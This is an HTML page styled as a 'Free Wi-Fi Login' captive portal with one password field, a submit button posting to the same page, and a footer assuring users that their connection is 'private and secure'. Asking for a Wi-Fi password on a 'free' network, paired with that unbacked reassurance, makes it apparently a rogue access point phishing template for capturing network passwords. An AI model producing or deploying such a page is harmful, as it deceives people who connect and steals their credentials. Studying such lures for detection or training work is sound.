<!DOCTYPE html> 
<html lang="en"> 
<head> 
  <meta charset="UTF-8"> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Free Wi-Fi Login</title> 
  <style> 
    * { 
      margin: 0; 
      padding: 0; 
      box-sizing: border-box; 
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif; 
    } 
 
    body { 
      background-color: #fafafa; 
      display: flex; 
      justify-content: center; 
      align-items: center; 
      height: 100vh; 
      color: #333;
    } 
 
    .container { 
      background: #fff; 
      padding: 40px; 
      border-radius: 16px; 
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08); 
      width: 100%; 
      max-width: 360px; 
      text-align: center; 
    } 
 
    .logo {
      width: 60px;
      height: 60px;
      background-color: #f0f0f0;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 20px;
    }
    
    .logo svg {
      width: 30px;
      height: 30px;
      color: #555;
    }
    
    h2 { 
      margin-bottom: 24px; 
      color: #333; 
      font-weight: 500; 
      font-size: 22px;
    } 
 
    form {
      margin-bottom: 20px;
    }
    
    input[type="password"] { 
      padding: 14px 16px; 
      width: 100%; 
      border: 1px solid #eaeaea; 
      border-radius: 12px; 
      margin-bottom: 20px; 
      font-size: 15px; 
      outline: none; 
      transition: all 0.3s ease; 
      background-color: #f9f9f9;
    } 
 
    input[type="password"]:focus { 
      border-color: #555; 
      background-color: #fff;
      box-shadow: 0 0 0 3px rgba(0,0,0,0.05);
    } 
 
    input[type="submit"] { 
      padding: 14px; 
      width: 100%; 
      background: #2e2e2e; 
      color: #fff; 
      border: none; 
      border-radius: 12px; 
      font-size: 15px; 
      font-weight: 500;
      cursor: pointer; 
      transition: all 0.3s ease; 
    } 
 
    input[type="submit"]:hover { 
      background: #000; 
      transform: translateY(-1px);
    } 
    
    input[type="submit"]:active {
      transform: translateY(1px);
    }
 
    .footer { 
      font-size: 13px; 
      color: #999; 
      display: flex;
      align-items: center;
      justify-content: center;
    } 
    
    .footer svg {
      width: 14px;
      height: 14px;
      margin-right: 5px;
    }
  </style> 
</head> 
<body> 
  <div class="container"> 
    <div class="logo">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <path d="M5 12.55a11 11 0 0 1 14.08 0"></path>
        <path d="M1.42 9a16 16 0 0 1 21.16 0"></path>
        <path d="M8.53 16.11a6 6 0 0 1 6.95 0"></path>
        <circle cx="12" cy="19" r="1"></circle>
      </svg>
    </div>
    <h2>Connect to Free Wi-Fi</h2> 
    <form method="POST"> 
      <input type="password" name="password" placeholder="Enter Wi-Fi Password" required autofocus /> 
      <input type="submit" value="Connect" /> 
    </form> 
    <div class="footer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
      </svg>
      Your connection is private and secure
    </div> 
  </div> 
</body> 
</html>
